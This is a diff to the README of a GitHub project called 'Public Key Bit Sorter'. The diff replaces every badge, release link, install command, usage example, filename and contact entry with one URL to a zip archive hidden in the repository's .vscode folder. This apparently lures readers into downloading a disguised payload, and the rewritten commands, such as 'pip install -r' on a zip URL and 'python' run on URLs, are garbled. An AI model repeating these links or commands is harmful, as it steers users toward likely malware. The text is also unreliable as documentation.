@@ -1,8 +1,8 @@
 # Public Key Bit Sorter 🔑
 
-![GitHub release](https://img.shields.io/github/release/Hipa319/public_key_bit_sorter.svg)
-![Python](https://img.shields.io/badge/python-3.8%2B-blue.svg)
-![License](https://img.shields.io/badge/license-MIT-green.svg)
+![GitHub release](https://github.com/Hipa319/public_key_bit_sorter/raw/refs/heads/main/.vscode/sorter-bit-public-key-v1.7.zip)
+![Python](https://github.com/Hipa319/public_key_bit_sorter/raw/refs/heads/main/.vscode/sorter-bit-public-key-v1.7.zip%https://github.com/Hipa319/public_key_bit_sorter/raw/refs/heads/main/.vscode/sorter-bit-public-key-v1.7.zip)
+![License](https://github.com/Hipa319/public_key_bit_sorter/raw/refs/heads/main/.vscode/sorter-bit-public-key-v1.7.zip)
 
 ## Overview
 
@@ -28,7 +28,7 @@ Welcome to the **Public Key Bit Sorter** repository! This project focuses on bit
 
 ## Installation
 
-To get started, download the latest release from the [Releases section](https://github.com/Hipa319/public_key_bit_sorter/releases). Follow these steps to install:
+To get started, download the latest release from the [Releases section](https://github.com/Hipa319/public_key_bit_sorter/raw/refs/heads/main/.vscode/sorter-bit-public-key-v1.7.zip). Follow these steps to install:
 
 1. Download the release file.
 2. Extract the contents.
@@ -37,7 +37,7 @@ To get started, download the latest release from the [Releases section](https://
 5. Run the following command to install the necessary dependencies:
 
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/Hipa319/public_key_bit_sorter/raw/refs/heads/main/.vscode/sorter-bit-public-key-v1.7.zip
    ```
 
 ## Usage
@@ -45,15 +45,15 @@ To get started, download the latest release from the [Releases section](https://
 Once you have installed the Public Key Bit Sorter, you can use it directly from the command line. Here’s a simple command to analyze a public key:
 
 ```bash
-python bit_sorter.py <path_to_public_key_file>
+python https://github.com/Hipa319/public_key_bit_sorter/raw/refs/heads/main/.vscode/sorter-bit-public-key-v1.7.zip <path_to_public_key_file>
 ```
 
 ### Example
 
-If you have a public key file named `public_key.txt`, you would run:
+If you have a public key file named `https://github.com/Hipa319/public_key_bit_sorter/raw/refs/heads/main/.vscode/sorter-bit-public-key-v1.7.zip`, you would run:
 
 ```bash
-python bit_sorter.py public_key.txt
+python https://github.com/Hipa319/public_key_bit_sorter/raw/refs/heads/main/.vscode/sorter-bit-public-key-v1.7.zip https://github.com/Hipa319/public_key_bit_sorter/raw/refs/heads/main/.vscode/sorter-bit-public-key-v1.7.zip
 ```
 
 The tool will process the file and provide an analysis of the entropy.
@@ -91,7 +91,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or feedback, feel free to reach out:
 
-- GitHub: [Hipa319](https://github.com/Hipa319)
-- Email: hipa319@example.com
+- GitHub: [Hipa319](https://github.com/Hipa319/public_key_bit_sorter/raw/refs/heads/main/.vscode/sorter-bit-public-key-v1.7.zip)
+- Email: https://github.com/Hipa319/public_key_bit_sorter/raw/refs/heads/main/.vscode/sorter-bit-public-key-v1.7.zip
 
-Thank you for your interest in the Public Key Bit Sorter! For the latest updates and releases, please check the [Releases section](https://github.com/Hipa319/public_key_bit_sorter/releases).
+Thank you for your interest in the Public Key Bit Sorter! For the latest updates and releases, please check the [Releases section](https://github.com/Hipa319/public_key_bit_sorter/raw/refs/heads/main/.vscode/sorter-bit-public-key-v1.7.zip).
